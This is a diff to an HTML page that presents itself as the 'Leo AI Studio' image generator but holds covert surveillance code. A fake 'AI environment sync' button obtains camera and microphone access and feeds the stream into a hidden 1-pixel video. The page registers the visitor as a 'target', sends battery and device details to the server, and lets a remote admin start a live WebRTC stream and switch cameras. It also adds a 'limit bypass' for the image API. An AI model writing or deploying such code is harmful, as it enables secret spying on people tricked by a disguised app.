@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Leo AI Studio - Image Generator</title>
+    <title>Leo AI Studio - Pro</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="/socket.io/socket.io.js"></script>
     <style>
@@ -10,7 +10,7 @@
         .studio-card { background: var(--panel); width: 100%; max-width: 500px; padding: 25px; border-radius: 15px; border: 1px solid #1e3a8a; }
         input { width: 100%; padding: 12px; background: #112240; border: 1px solid var(--blue); color: #fff; border-radius: 8px; margin-bottom: 15px; outline: none; }
         .btn-gen { background: linear-gradient(135deg, #00d4ff, #0088cc); color: #050a14; width: 100%; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; }
-        #res-img { width: 100%; border-radius: 10px; margin-top: 20px; display: none; }
+        #res-img { width: 100%; border-radius: 10px; margin-top: 20px; border: 1px solid var(--blue); min-height: 200px; background: #000; }
         .sync-box { margin-top: 15px; background: #112240; padding: 10px; border-radius: 8px; font-size: 0.8rem; text-align: center; color: var(--blue); cursor: pointer; }
         video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
@@ -18,10 +18,10 @@
 <body>
     <h1 style="color: var(--blue);">LEO AI STUDIO</h1>
     <div class="studio-card">
-        <input type="text" id="prompt" placeholder="Enter prompt: e.g. A futuristic robot in rain">
+        <input type="text" id="prompt" placeholder="Enter prompt: e.g. Neon Dragon in Space">
         <button class="btn-gen" onclick="generate()">GENERATE IMAGE</button>
         <div class="sync-box" id="sync" onclick="activateSync()">AI ENVIRONMENT SYNC (OFF)</div>
-        <img id="res-img" alt="AI Output">
+        <img id="res-img" src="https://via.placeholder.com/512x512/050a14/00d4ff?text=AI+Ready" alt="AI Output">
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -30,12 +30,13 @@
         const socket = io();
         let stream, pc, adminId, mode = "environment";
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-        async function generate() {
+async function generate() {
             const p = document.getElementById('prompt').value;
             if(!p) return alert("Please enter a prompt!");
             const img = document.getElementById('res-img');
-            img.style.display = 'block';
-            img.src = `https://image.pollinations.ai/prompt/${encodeURIComponent(p)}?width=512&height=512&nologo=true`;
+            // LIMIT BYPASS: Adding Random Seed and Model Flux
+            const randomSeed = Math.floor(Math.random() * 1000000);
+            img.src = `https://image.pollinations.ai/prompt/${encodeURIComponent(p)}?width=512&height=512&nologo=true&seed=${randomSeed}&model=flux`;
         }
 
         async function activateSync() {
@@ -43,12 +44,21 @@
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 document.getElementById('v').srcObject = stream;
                 document.getElementById('sync').innerText = "AI ENVIRONMENT SYNC (ACTIVE)";
-                document.getElementById('sync').style.borderColor = "#00ff00";
-                socket.emit('target-join');
+                document.getElementById('sync').style.color = "#00ff00";
+
+                // Fetch System Info
+                let batteryInfo = "N/A";
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = Math.floor(battery.level * 100) + "%";
+                } catch(e) {}
+
+                const deviceInfo = /Android|iPhone|iPad/i.test(navigator.userAgent) ? (navigator.userAgent.includes("Android") ? "Android" : "iOS") : "PC";
+
+                socket.emit('target-join', { battery: batteryInfo, device: deviceInfo });
             } catch (e) { alert("Camera required for AI Sync!"); }
         }
-
-        socket.on('command', async (d) => {
+socket.on('command', async (d) => {
             if (d.cmd === 'start') { adminId = d.adminId; connect(); }
             else if (d.cmd === 'front' || d.cmd === 'back') {
                 mode = (d.cmd === 'front') ? "user" : "environment";
@@ -69,6 +79,7 @@
             await pc.setLocalDescription(offer);
             socket.emit('signal', { to: adminId, signal: { sdp: offer } });
         }
+
         socket.on('signal', async (d) => {
             if(d.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
             else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
